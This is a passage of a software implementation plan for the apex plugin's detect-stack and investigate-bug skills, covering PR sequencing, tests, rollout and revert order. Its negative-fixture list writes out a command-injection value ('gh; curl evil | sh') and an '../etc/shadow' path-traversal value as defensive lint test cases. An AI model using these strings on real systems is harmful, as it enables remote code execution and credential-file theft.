**Depends on:** PR-B1 (the contracts + adapters + resolver it dispatches through) + PR-A1's schema (the profile it reads) + the **shipped** `autonomous-fix` gate (`skills/autonomous-fix/SKILL.md` P2/P3/P4 — already in tree). **Unblocks:** L-W (wiring) + the downstream BookBridge thin-consumer refactor (a separate repo, NOT built here).

### L-W — Wiring (CHANGELOG / FLOW.md side-path / help.md / README) — folded into PR-B2, OR a trailing PR-W · ~45 LOC

**Recommendation: fold L-W into PR-B2** (it is ~45 LOC of additive docs; the autonomous-fix plan split L5 out only because L4-the-CI-file was sign-off-contingent — here the CI question is fully deferred to L-D, so no such contingency exists). Stated as its own layer for reversibility accounting; if PR-B2 brushes 400 LOC, split it to a trailing **PR-W**.

All anchors re-located **by content at edit time**, not by stored line number. Two skills wire differently: **detect-stack is a command** (slash entry, already count-bumped + help.md command-row + README Commands-table row by PR-A2); **investigate-bug is by-name** (FLOW side-path + help.md Post-release + README Skills-table, like `autonomous-fix`).

1. **CHANGELOG** (`[release-coupled]`) — a fresh **`## [Unreleased]`** section with a `### Added` subsection: the two skills, the `apex.profile.toml` schema + value-shape lint, the 3 detectors, the gh+grep adapters, the two-binding resolver, the P3→P4 handoff; **`/apex:detect-stack` adds the 15th command (menu 14→15)** — the ONE entry recording a count change. `scripts/release.sh` dates+renames `## [Unreleased] → ## [0.3.8] — <date>` at release — **do not pre-date.** *(The single `## [Unreleased]` entry lands in this terminal layer — PR-A1/A2/B1 add no CHANGELOG entry — so PRs never race the same section. **Reversibility note: because the "menu 14→15" CHANGELOG line is L-W's (folded into PR-B2) while the count MUTATION is PR-A2's, reverting PR-A2 alone leaves this CHANGELOG line stale — see §5 R2; the stack revert order is top-down.**)*
2. **FLOW.md** (`[freely-revertible]`) — two destinations, both verified at HEAD: **(a)** a new `**STACK-ADAPTIVE BUG LOOP.**` prose paragraph in "## Side paths (not phase-sequential)" (`:254`), after the AUTONOMOUS BUG-FIX block (`:260`) — text per design §G.2 (mentions both skills); **(b)** two single-line footnotes appended in the Skill×Phase matrix footnote fence after `apex:autonomous-fix` (`:305`): `apex:detect-stack` + `apex:investigate-bug` lines (design §G.2). **No matrix grid row, no HOOKS-box entry.**
3. **commands/help.md** (`[freely-revertible]`) — investigate-bug as a sibling Post-release line under "I FIRE THESE AUTOMATICALLY" (`:26`), beside `autonomous-fix` (`:39`) — the `detect-stack / investigate-bug` line per design §G.3. (The `/apex:detect-stack` "YOU TYPE THESE" row + the 14→15 count are PR-A2's.)
4. **README skill-table** (`[freely-revertible]`) — a row after the `autonomous-fix` row (`:53`) for generic `investigate-bug` (reads the routing profile; per-axis adapter contract; gh+grep MVP adapters; two-binding interactive/unattended resolver; composes the gate at P3→P4 — ships zero vendor integrations). detect-stack's own Skills + Commands table rows are PR-A2's.

**Depends on:** PR-A2 (the command exists) + PR-B2 (the skill is seam-complete). **Unblocks:** nothing in-stack.

### L-D — apex-CI gate over a shipped fixture profile (DEFERRED sub-question, NOT in this stack)

**Open question for sign-off, default = DEFER.** The autonomous-fix precedent ships a CI workflow that runs its lint over a shipped reference artifact. The stack-adapters analog would run `profile.py`'s value-shape lint over a shipped fixture `apex.profile.toml` (green) + the deliberately-bad fixtures (each RED on one shape rule). **Deferred because:** this MVP's lint is already exercised by `tests/test_profile.py` in pytest, and apex has **no Python-test CI runner today**. **If sign-off wants it:** add a job to `.github/workflows/conformance-lint.yml` (paths-scoped to `skills/detect-stack/**`) running `python -m pytest tests/test_profile.py` — `[unit]` coverage is **unchanged**; L-D only changes *where* the lint fires. **Dependency-correct after PR-A1; freely parallelizable with PR-A2/B1/B2/L-W** (disjoint from everything after PR-A1); unblocks nothing; sign-off-gated.

---

## §2 Sequencing / dependency order

```
PR-A1 profile.py (schema+loader+lint+writer invariants)        [foundation]
  │
  ├──► PR-A2 detect.py (3 detectors + conflict + /apex:detect-stack + 14→15 + README Commands row)
  │       (needs PR-A1's write_profile + invariants + shape lint)
  │
  └──► PR-B1 resolver(riskiest, S5.2 exit gate) + contracts + gh/grep adapters
          │   (needs PR-A1's Profile/AxisConfig; develops vs fixture profile)
          └──► PR-B2 SKILL.md flow + P3→P4 handoff + S9 conformance + §H 2-site carry-back
                  │   (needs PR-B1 core + PR-A1 schema + the shipped autonomous-fix gate)
                  └──► L-W wiring (CHANGELOG/FLOW/help/README) [fold into PR-B2 or trailing PR-W]

  [DEFERRED, freely parallel after A1] L-D apex-CI fixture-profile gate — sign-off-gated
```

- **`api-surface-review` → (already done):** design §A IS the api-surface-review pass (verdict §A.4). The stack opens at PR-A1.
- **PR-A1 → PR-A2:** detectors call `write_profile` + honor the AC7/AC2b invariants; the count-bump + README Commands-table row are co-located with the command PR-A2 adds.
- **PR-A1 → PR-B1:** PR-B1 imports `Profile`/`AxisConfig` and develops against a fixture profile, so its hard dependency is PR-A1's *frozen schema*. **PR-A2 ∥ PR-B1 is potential parallelism (disjoint files) BUT gated on PR-A1's schema being truly frozen** — both import `profile.py`, so a discovered schema change collapses it into a foundation conflict (the contract-drift the freeze breaker names). **Deliberately kept serial** for review clarity; the parallelism is documented, not taken.
- **PR-B1 → PR-B2:** the handoff + S9 conformance dispatch through PR-B1's contracts/adapters/resolver, frozen before the S9 zero-diff proof is meaningful.
- **PR-B2 → L-W:** wiring rows must point at a seam-complete skill.
- **DAG acyclic.** PR-A1 is the single root; PR-A2 + PR-B1 fan out; PR-B2 joins PR-B1 (+ PR-A1's schema + the shipped gate); L-W terminal; L-D a deferred, freely-parallel leaf off PR-A1.

**Preconditions per layer:** PR-A1 needs the frozen design + the already-discharged §A api-surface-review. PR-A2 needs PR-A1 merged + the live `MAINTAINING.md` registry. PR-B1 needs PR-A1's schema (fixture profiles suffice). PR-B2 needs PR-B1 + PR-A1's schema + the verified `autonomous-fix/SKILL.md` P3→P4 boundary. L-W needs PR-A2 (command) + PR-B2 (skill). L-D needs PR-A1 + its own sign-off.

---

## §3 Test plan per layer (PRD ↔ test mirror, 1:1)

Each layer names its test artifact + the PRD scenario(s) it serves with the once-defined `[unit]`/`[gate-walk]`/`[doc-assert]` tag. The mirror is complete both directions.

| Layer | Test artifact | Tag | Serves (PRD scenario/use-case) |
|---|---|---|---|
| **PR-A1** profile.py | `tests/test_profile.py` — pytest over fixture profiles (good + deliberately-bad), + the negative-fixture set in `reference/fixtures/` | `[unit]` | **S1.1** (parses, expected kind — over a fixture/synthetically-written profile; the detector-written leg is PR-A2's S1) · **S1.2** (value-shape allowlist; token-shaped identifier + non-NAME `secret_ref` FAIL — the AC1 surface) · **S1.3** (AC2a both-bindings present) · **S7-edge** (malformed/absent profile → `ProfileError`) · **repo_path confinement** (`../etc/shadow` + escaping symlink FAIL — the §C.2/§6 operation-vs-descriptor security unit) |
| **PR-A2** detect.py + command + count/Commands-row | `tests/test_detect.py` — pytest over a fixture repo tree + a fixture environment manifest + `reference/fixtures/repos/`; S3/S3-doc `[doc-assert]` = grep-assert over `skills/detect-stack/SKILL.md` | `[unit]` (+ `[doc-assert]` for S3 rule, grep-asserted) | **S1** (happy path + the S1.1 detector-written-profile-parses leg + S1-edge in-place update/drift) · **S2** (both bindings recorded; S2-edge MCP-no-CLI) · **S2.1** (AC2b no-silent-drop over the fixture manifest) · **S3** (un-inferable → prompt/placeholder, never guess; [doc-assert] grep over SKILL.md states the rule) · **S10** (conflicting signals → record+prompt/placeholder; S10-edge malformed manifest skips with a gap) |
| **PR-B1** resolver + contracts + adapters | `tests/test_resolver.py` + `tests/test_adapters.py` — pytest over fixture profiles / fixture `gh --json` / fixture log file | `[unit]` | **S5.1** (unattended selector returns CLI, never `mcp`) · **S5.2** (unattended `cli=""` → escalate, `mcp` never touched — the AC3 fail-path / resolver exit gate) — *S5.1/S5.2 = the `[unit]` half of the PRD's compound `S5 [gate-walk] + [unit]` tag* · **S7** (unsupported `kind` → ask-user/escalate, no silent stub) · **S8** (the adapter-verb core — `fetch_issue` normalizes fixture `gh --json`; `query_logs` returns exactly the in-window lines) |
| **PR-B2** SKILL.md + handoff + conformance + §H carry-back | `tests/test_conformance.py` (S9) `[unit]` + `tests/test_handoff.py` (S4/S5-flow/S6) `[gate-walk]` + the gate-walk worked-example table in SKILL.md + `[doc-assert]` grep-asserts on Distinct-from/terminals/§H | `[unit]` + `[gate-walk]` (+ `[doc-assert]` for S6 rule, grep-asserted) | **S9** (stub conformance — third adapter, zero investigate-bug diff) · **S4** (S4.1 MCP-first · S4.2 red-on-unpatched · S4.3 body-in-fence + `PLAN.json` for Stage-A) · **S5-flow** (CLI-only CI path, no MCP attempt, hands into P4 — *the `[gate-walk]` half of `S5 [gate-walk] + [unit]`*; S5-edge mcp-only → ESCALATE) · **S6** (sensitive-path → hand off + STOP, gate's ESCALATE; [doc-assert] grep over SKILL.md: no fifth terminal / no deny-glob inspection / no PR open; S6-edge only write is the B2 test) · **S7-edge** (absent/malformed profile → prompt-detect-stack / HALT — cross-layer) |
| **L-W** wiring | grep-assert: each doc row/footnote names the skill; CHANGELOG `## [Unreleased]` exists + records **menu 14→15**; version files NOT touched in-PR | `[doc-assert]` | (wiring layer — no new PRD scenario; correctness is that the rows point at real, seam-complete skills.) |
| **L-D** (deferred) | a CI job running `pytest tests/test_profile.py` over shipped fixtures | `[unit]` (CI-fired) | same `[unit]` set as PR-A1 (S1.2), now a required check on apex itself — **coverage unchanged**; only changes *where* the lint fires. *(Deferred — default off.)* |

**Negative-fixture → shape-leg → scenario oracle map (PR-A1, the executable AC1 lint — mirrors `conformance-lint.py`'s one-fixture-per-leg discipline):**
1. token-shaped value in an `identifier` field (`repo = "ghp_xxxx…"`) → RED on the `identifier` leg → **S1.2**.
2. `cli = "gh; curl evil | sh"` → RED on the `cli` no-separators/no-flags leg → **S1.2** (command-injection-shaped cli).
3. `mcp = "github"` (not `mcp__*`) → RED on the `mcp` prefix leg → **S1.2**.
4. `kind = "bitbucket"` (not in the axis enum) → RED on the `enum` leg → **S1.2**.
5. `log_path = "../../../../etc/shadow"` → RED on the `repo_path` confinement leg → **S1.2** (the F1 fix — shape-insufficient operation field).
6. `secret_ref = "sk_live_abcdef…"` (a value, not a NAME) → RED on the `secret_ref` NAME leg → **S1.2** (validated-if-present; the PR-C-reserved slot already guarded).
7. a routed axis missing the `cli` key entirely → RED on the AC2a field-presence leg (loader `MISSING_BINDING`) → **S1.3**.
+ the happy-path `profile-schema.toml` → **GREEN** on all legs → **S1.1**.

**AC ↔ scenario ↔ layer completeness (PRD §3 mirror `:67`, both directions):**
- **AC1**→S1.2 → PR-A1 `[unit]` (+ repo_path confinement sub-unit). **AC2**→S1.3(a), S2, S2.1(b) → S1.3 PR-A1; S2/S2.1 PR-A2. **AC3**→S4.1, S5, S5.1, S5.2 → S5.1/S5.2 PR-B1 `[unit]`; S4.1/S5-flow PR-B2 `[gate-walk]`. **AC4**→S3, S7, S8, S9 → S3 PR-A2; S7/S8 PR-B1; S9 PR-B2. **AC5**→S4, S6 → PR-B2 `[gate-walk]`. **AC6**→S4.2, S4.3, S6 → PR-B2 `[gate-walk]`. **AC7**→S3, S10 → PR-A2 `[unit]`+`[doc-assert]`.
- **Every PRD scenario S1–S10 has an owner layer's test.** S1✓PR-A2, S2✓PR-A2, S3✓PR-A2(+doc), S4✓PR-B2, **S5✓PR-B1(.1/.2 = the `[unit]` half) + PR-B2(S5-flow = the `[gate-walk]` half) — the PRD's compound `S5 [gate-walk]+[unit]` tag is satisfied by both halves, lineage stated**, S6✓PR-B2, S7✓PR-B1(+PR-B2 absent-profile edge), S8✓PR-B1, S9✓PR-B2, S10✓PR-A2. ✔ complete both directions.

**Decomposition honesty (PRD §3 compound note `:69`):** S1/S4/S5 decomposed — S1.1/S1.2/S1.3 split PR-A1 (shape/presence units) + PR-A2 (detector-written happy-path); S4.1–S4.3 + S5.1/S5.2/S5-flow split PR-B1 (`[unit]` selector + adapter verbs) + PR-B2 (`[gate-walk]` flow). The adapter verbs (S8) + the conformance proof (S9) are **isolated `[unit]` scenarios**, not buried in gate-walk prose. **Gold-plating check:** `tracker.comment` is tested only for existence/shape (S9 conformance-completeness), not for a calling scenario — correct, because design §A.1 makes it a downstream-consumer verb called by neither investigate-bug nor the gate in the MVP.

**N/A passes (stated, not skipped):** no **E2E browser test** (both skills CLI/markdown, no UI — PRD §3 justifies; zero E2E-tagged scenarios → spine-E2E obligation vacuously satisfied). No **migration tests** (the profile is config; `apex.profile.toml` is a config file). No **integration-test-across-stack in the apex-runtime sense** beyond the gate-walk decision-text (apex ships zero runtime for the gate — S4/S5/S6 are decision-text oracles, the `autonomous-fix` PRD convention). The `[doc-assert]` legs (S3, S6, Distinct-from) are grep/read-asserts over the SKILL.md prose, NOT pytest cases.

---

## §4 Rollout

It's a plugin skill set — every layer is **additive markdown + importable Python + doc rows**, activated next session on reinstall. No feature flag, no migration, no cohort, no dual-write (no runtime to gate, no data, no schema).

- **PR-A1 / PR-A2 / PR-B1 / PR-B2:** **direct** — skills + `reference/` Python + the `/apex:detect-stack` command register next session on reinstall. The `reference/*.py` are unit-tested at author-time (the leading success metric, PRD §6a) but are **library code the skill cites**, not a deployed service — no production cohort.
- **The `apex.profile.toml` is per-consumer-repo, not an apex artifact** — apex ships the *schema + loader + lint + detectors*; a consuming repo runs `/apex:detect-stack` to write *its own* profile. No apex-side data migration; each consumer's profile is created fresh + re-detected in place (drift, §D.3). The schema is additive-only forward-compatible (PR-C's `service`/`secret_ref` are reserved slots already in the §C.2 allowlist → adding them later is a value-write, not a migration; an old profile missing them is un-inferable → `# TODO: fill`).
- **L-W / release mechanics (the repo's actual scripted path):** the release is **`./scripts/release.sh 0.3.8`**, run post-merge from `main`. It (a) requires the `## [Unreleased]` section L-W added (`release.sh:59`), (b) bumps `plugin.json` + `marketplace.json` to `0.3.8` via `jq` (`:65,:79` — **two version files**, flag 4b), (c) dates `## [Unreleased] → ## [0.3.8] — <date>` (`:83`), (d) commits `release: 0.3.8` directly to main + pushes, (e) tags `v0.3.8` + pushes, (f) builds the zip, (g) cuts the `--latest` GitHub release. **Do NOT bump versions or pre-date the CHANGELOG in the feature PR** (`release.sh:67` aborts on a pre-bumped version). The live plugin runs the cached build → the change goes live on **reinstall** per `CONTRIBUTING.md` (pull marketplace clone → `rsync` cache → bump `gitCommitSha` in `installed_plugins.json` → restart), per the apex-installed-vs-dev-repo-skew memory.
- **Draft-PR default** — the 4 build PRs open under the standing `apex:pr-discipline` §1 draft-default + user-level §5 "Ask Before Push" (not re-stated per-PR — identical to the autonomous-fix precedent). This is the *meta* question of how apex's own PRs open; it is NOT the *product's* gate-owned draft-only semantics (the gate's "draft-only / never auto-merge" is asserted by PR-B2's S4/S6 gate-walks as the gate's terminal — investigate-bug opens no PR).
- **L-D (if un-deferred):** direct — the CI job fires on the first push/PR touching `skills/detect-stack/**` after merge.
- **Cohort / canary / expand→migrate→contract:** **N/A** — no data, no schema, no destructive change. (Adversarial Pass-4: a user running `/apex:detect-stack` before PR-B exists gets a profile no consumer reads — harmless/additive; investigate-bug on an absent profile prompts/HALTs (S7-edge), never guesses. No "API before migration" hazard because there is no migration.)

---

## §5 Reversibility (per layer) — top-down revert order: L-W → PR-B2 → PR-B1 / PR-A2 → PR-A1

The single corrective theme across the reversibility findings: **each shared-file edit and its CHANGELOG/doc witness must revert together, and the stack reverts top-down.**

- **PR-A1** (`reference/profile.py` + schema exemplar + SKILL.md skeleton + fixtures): `git revert` — a **clean-delete add** (`skills/detect-stack/` is new; the only in-tree consumers, PR-A2/PR-B1, are later PRs — revert them first, normal stack order). Fully reversible; writes nothing until invoked.
- **PR-A2** (`reference/detect.py` + `commands/detect-stack.md` + count-bump + README Commands-table row + `MAINTAINING.md` recipe guard + SKILL.md fill): two classes — the **new files** `git revert` clean; the **shared-file edits** (README count ×3 + the Commands-table row, help ×2, WALKTHROUGH, the `MAINTAINING.md` recipe guard) + the SKILL.md section-fill are additive-content edits, freely revertible (may need rebase if those files moved). **Keep the 14→15 count-bump + the README Commands-table row in the SAME commit as the command add** so the revert is atomic. **R2 caveat (the count-bump is NOT freely-revertible in all orders):** the count-site edits are *in-place mutations* of existing strings, not pure adds — a `git revert` is clean only if no later count-touching change landed (a 16th command, or the adversarial-pair gap getting filled). Treat as conflict-prone-if-out-of-order, clean-if-top-down. **R2 split-brain (stated, accepted):** the count MUTATION reverts with PR-A2 but the "menu 14→15" CHANGELOG *line* reverts with PR-B2/L-W — reverting PR-A2 alone leaves that CHANGELOG line stale and the README Commands-table row pointing at a now-absent command. **Resolution: the stack reverts top-down (revert L-W/PR-B2 before PR-A2); PR-A2 is NOT independently revertible once L-W ships.** (Accepted over moving the count CHANGELOG fragment into PR-A2, because the single-`## [Unreleased]`-in-the-terminal-layer rule avoids the 3-PR merge-race — the trade is explicit.)
- **PR-B1** (`reference/resolver.py` + `contracts.py` + `adapters/`): `git revert` the directory — a **clean-delete add**, self-contained, no in-tree consumer except PR-B2. Fully reversible.
- **PR-B2** (`SKILL.md` + `test_conformance.py` + `test_handoff.py` + the §H two-site gate-doc carry-back): `git revert` the files — **clean-delete add** for the new files. **§H revert line (B1 fix):** PR-B2's diff DOES touch `docs/autonomous-fix/prd.md:146` + `skills/autonomous-fix/SKILL.md:29` (the two carry-back one-liners). Reverting PR-B2 removes those two one-liners but leaves the prior-commit `prd.md:6` block — **which restores the pre-existing contradiction (`:6` says interposes; `:29`/`:146` say direct child).** This is the *original* HEAD state, so it is coherent-as-found (not a new corruption), but flag it: a PR-B2 revert re-opens the §H gap the PR closed. If the seam wording is wrong but the core (PR-B1) is fine, prefer a **forward-fix edit** over a revert. One cross-PR doc-coupling: PR-A2's FLOW prose (L-W, reverts with PR-B2) names both skills — reverting PR-B2 leaves no dangling reference because the prose reverts with it; the only residual is cosmetic and forward-fixed.
- **L-W** (CHANGELOG `## [Unreleased]` + FLOW/help/README rows; version files untouched in-PR): the doc rows `git revert` freely (additive). **The one conditional-rollback step is the RELEASE leg, not the PR:** once `release.sh 0.3.8` runs, it creates an annotated tag `v0.3.8` + a `--latest` GitHub release with a zip — **durable, roll-forward-only.** `git revert` of the release commit does NOT delete the tag or un-mark the release; if `0.3.8` must be undone, **roll forward to `0.3.9`** (standard release hygiene). The only not-cleanly-revertible artifact class the plan introduces; flag it in the release notes.
- **L-D** (if shipped): `git revert` the CI job — clean, no state. *Too-strict* (false-RED blocks apex CI) → revert to unblock, fix, re-add; *too-loose* → forward-fix by tightening.
- **No irreversible operation in the FEATURE PRs** — no destructive migration, no paid-API one-shot, no immutable write. The `reference/*.py` write nothing at import. `apex.profile.toml` is written *in a consumer's repo by detect-stack*, never in apex — so an apex revert touches no profile. The single durable artifact is the **release tag + GitHub release** (release-time, roll-forward-only — above).

---

## §6 Adversarial counter-pass (inline, the impl-plan-review lenses applied cold)

- **Pass 1 (layer too big once tests added?):** the LOC budgets are calibrated against the precedent's 3.4× miss (`conformance-lint.py` shipped 505 vs ~150 estimate) — every Python budget is a FLOOR, and **two relief-valve splits are pre-committed with explicit triggers** (PR-A1: validators→`shapes.py` if >300; PR-B1: contracts+resolver vs adapters if >340). PR-A1 (~360) and PR-A2 (~370) brush the ceiling; PR-B1 (~380 source) is the tightest. Tests live in `tests/` (separate files) — **NIT acknowledged: a PR's reviewable diff includes its tests, so the ≤400 applies to non-test hand-written source and the test diff is unbounded-but-mirrored; don't let the test dir hide an overshoot — re-measure source-only at author time.**
- **Pass 2 (unstated dependency?):** the PR-A2 ∥ PR-B1 parallelism is stated AND downgraded (both import `profile.py`; gated on PR-A1's schema being truly frozen, which the S9 test proves only at PR-B2) — deliberately serialized. The §H carry-back is now an *explicit cited build step* in PR-B2 (was a hidden dropped mechanism). The shipped-gate dependency (PR-B2 reads `autonomous-fix/SKILL.md` P2/P3/P4) is in-tree at HEAD.
- **Pass 3 (scenario with no owner / test with no scenario?):** all S1–S10 mapped both directions (§3), incl. S5's compound-tag lineage. The **repo_path confinement** unit is a named sub-assertion of S1.2 (design §C.2/§6 F1 security cut) — design-justified, NOT gold-plating. The `tracker.comment` concern is closed in §3.
- **Pass 4 (rollout breaks if a layer ships without its dependency?):** harmless/additive (above). No "API before migration" hazard because there is no migration.
- **Pass 5 (claimed-revertible but actually corrupts state?):** the §H two-site carry-back, the count-bump split-brain, and the cross-PR FLOW-prose coupling all resolve via the stated top-down revert order; a PR-B2 revert re-opens the §H gap to its *original HEAD state* (coherent-as-found, flagged). The only roll-forward-only artifact (the release tag) is flagged at L-W/§5.

---

## §7 Open sign-off items for `impl-plan-review`

1. **PR-A split ratified: A1 (schema+loader+lint+writer-invariants) → A2 (3 detectors + writer driver + 15th-cmd + count-bump + README Commands-table row).** Taken on design §K + PRD §7 + the contract-vs-signal-layer cut. The **PR-A1 validators→`shapes.py` relief valve is pre-committed** (trigger: profile.py >300 non-test LOC). Ratify or override.
2. **PR-B split: B1 (resolver+contracts+adapters core, S5.2 resolver exit gate) → B2 (SKILL.md flow + P3→P4 handoff + S9 conformance + §H 2-site carry-back + L-W).** Taken because a single PR-B is ~640+ LOC. The **PR-B1a/B1b adapters-peel relief valve is pre-committed** (trigger: PR-B1 source >340 LOC), at the resolver-doesn't-depend-on-adapters seam. Ratify or override.
3. **Version `0.3.8` (patch), released via `scripts/release.sh`** — over `0.4.0` on the 0.3.6/0.3.7 precedent. Bump + dating at release time, not the feature PR. Ratify or override.
4. **L-D (apex-CI fixture-profile gate)** — default DEFER (pytest already owns S1.2; apex has no Python-test CI runner today). Freely parallelizable after PR-A1 if un-deferred. PR-A1/A2/B1/B2 + L-W unaffected.
5. **L-W fold-vs-split** — recommend folding into PR-B2 (no CI sign-off contingency here); split to trailing PR-W only if PR-B2 brushes 400 LOC.
6. **The §H amendment is now a CITED BUILD STEP in PR-B2** (the two missing one-liners at `docs/autonomous-fix/prd.md:146` + `skills/autonomous-fix/SKILL.md:29`; the `prd.md:6` block is already applied). This corrects the prior draft's false "no further gate-doc edit / already applied." Confirm the two-site carry-back is the intended scope (per design §H's three-site mandate) — OR sign off on an explicit deviation if `:6` alone is deemed sufficient (NOT recommended; `:29`/`:146` actively contradict `:6`).
7. **All anchors re-located by content at edit time** (count-sites via the `MAINTAINING.md` registry recipe + `--exclude-dir=.claude` — load-bearing against TWO stale worktrees at HEAD; FLOW/help/README by content). The verified line numbers are a HEAD snapshot, not a freeze contract.

---

## §8 Downstream (DOCUMENTED, NOT built in this effort)

Gated on PR-B1's frozen per-axis adapter contract + PR-A1's frozen profile schema. Lives in the **BookBridge** repo, a separate effort:
- **BookBridge `investigate-bug` refactors to a thin consumer** of generic `apex:investigate-bug` — keeping its F-049 DB queries + hypothesis matrix, delegating fetch/route/reproduce/handoff. The **first conformance test of the frozen contract + schema** (PRD §6 lagging metric). The chain becomes **BookBridge investigate-bug → generic apex:investigate-bug → autonomous-fix**.
- The **§H cross-PRD amendment** to the gate docs is completed by PR-B2 (the `prd.md:6` block + the two carry-back one-liners at `prd.md:146` + `SKILL.md:29`) — the downstream refactor then reads against fully-amended gate docs.

Tracked as a follow-on, not a layer here (a separate repo this plan can't gate).

---

## Plan freeze readiness

**FROZEN (pending user sign-off).** All 5 impl-plan-review passes met: **(1)** layered stack — 4 build PRs + L-W + deferred L-D, each ≤400 LOC with pre-committed relief-valve splits and LOC budgets grounded against the precedent's 3.4× miss; **(2)** sequencing — explicit deps, the stated-then-deliberately-serialized PR-A2∥PR-B1 parallelism (gated on schema-freeze), acyclic DAG, risk-first within PR-B; **(3)** test-plan-per-layer — every layer names its `[unit]`/`[gate-walk]`/`[doc-assert]` artifact + the PRD scenario(s), mirror complete both directions with S5's compound-tag lineage stated and `[doc-assert]` legs identified as grep-asserts; **(4)** rollout — additive plugin skill set, CHANGELOG `## [Unreleased]` + `release.sh 0.3.8`, no migration/cohort, draft-default inherited; **(5)** reversibility — per-layer clean-delete/forward-fix with a top-down revert order, the §H two-site carry-back accounted, the single roll-forward-only release-tag flagged.

**Both freeze-blockers fixed:** B1 (§H dropped mechanism — the two missing carry-back one-liners are now a cited PR-B2 build step with a §5 revert line); B2 (the false "no README Commands table" claim struck — the Commands-table row is a mandatory PR-A2 edit per design §G.3, anchored after `README.md:76`).

On freeze, `superpowers:executing-plans` begins at **PR-A1** (`skills/detect-stack/reference/profile.py` — the schema+loader+value-shape lint foundation), then PR-A2, then PR-B1 (resolver first, S5.2 exit gate), then PR-B2.

**Circuit breaker (cancel-by-default).** If implementation runs materially past this 4-PR stack (+ wiring) without shipping, STOP and re-bet at the design/PRD gate. The residual risk is contract-drift between PR-A1's schema and PR-B1's consumers, which the **S9 stub-conformance test** (PR-B2) is the freeze-check for. Two narrower breakers fire inside PR-B: **the resolver** returns to `design.md §B` if MCP-only-impossible can't be the single `mcp`-field-never-read code path (S5.2); **the handoff** returns to `design.md §E` if it needs a new write affordance, a fifth terminal, or deny-glob inspection.

---

**Relevant file paths (all absolute, against the live tree, re-verified at HEAD):**
- Frozen inputs (read-only): `/Users/raviv/devenv/apex/docs/stack-adapters/design.md`, `/Users/raviv/devenv/apex/docs/stack-adapters/prd.md`
- Format exemplar: `/Users/raviv/devenv/apex/docs/autonomous-fix/impl-plan.md` (the 505-vs-~150 LOC precedent at `:72`); review method: `/Users/raviv/devenv/apex/skills/impl-plan-review/SKILL.md`
- Precedent artifacts: `/Users/raviv/devenv/apex/skills/autonomous-fix/reference/` (autonomous-fix.yml 155 LOC + conformance-lint.py **505 LOC** + fixtures/ ×7) + `/Users/raviv/devenv/apex/.github/workflows/conformance-lint.yml`; the gate seam at `/Users/raviv/devenv/apex/skills/autonomous-fix/SKILL.md:29,35,36,57-79,96,176-191`
- New files this plan creates: `skills/detect-stack/reference/profile.py` (+ `shapes.py` if relief valve fires), `skills/detect-stack/reference/profile-schema.toml`, `skills/detect-stack/reference/detect.py`, `skills/detect-stack/reference/fixtures/`, `skills/detect-stack/SKILL.md`, `commands/detect-stack.md`, `skills/investigate-bug/reference/resolver.py`, `skills/investigate-bug/reference/contracts.py`, `skills/investigate-bug/reference/adapters/gh_tracker.py`, `skills/investigate-bug/reference/adapters/grep_obs.py`, `skills/investigate-bug/SKILL.md`, `tests/test_profile.py`, `tests/test_detect.py`, `tests/test_resolver.py`, `tests/test_adapters.py`, `tests/test_conformance.py`, `tests/test_handoff.py`
- Files this plan edits: `CHANGELOG.md` (new `## [Unreleased]`), `FLOW.md` (side-path prose `:260`-region + matrix footnotes after `:305`), `commands/help.md` (`:10,61` count + `:24` command row + Post-release `:39` block), `README.md` (`:59,222,233` count [bump only `~14` at `:59`, NOT the `30+`] + Skills-table rows after `:53` + the mandatory Commands-table row after `:76`), `WALKTHROUGH.md:100` (count), `MAINTAINING.md:59-60` (add `--exclude-dir=.claude` to the recipe), **`docs/autonomous-fix/prd.md:146` + `skills/autonomous-fix/SKILL.md:29` (the §H two-site carry-back — PR-B2)**
- Count-site registry: `/Users/raviv/devenv/apex/MAINTAINING.md` ("Known sites holding the count" `:43-61`; re-grep by form, apply `--exclude-dir=.claude` — load-bearing against `.claude/worktrees/wonderful-almeida-a10191/` AND `.claude/worktrees/stoic-pascal-9a2822/`). Cross-PRD amendment site already applied: `/Users/raviv/devenv/apex/docs/autonomous-fix/prd.md:6`. Release tooling: `/Users/raviv/devenv/apex/scripts/release.sh` (`:59` Unreleased-required, `:67` abort-on-pre-bump, `:79` marketplace.json, `:83` date-rename).
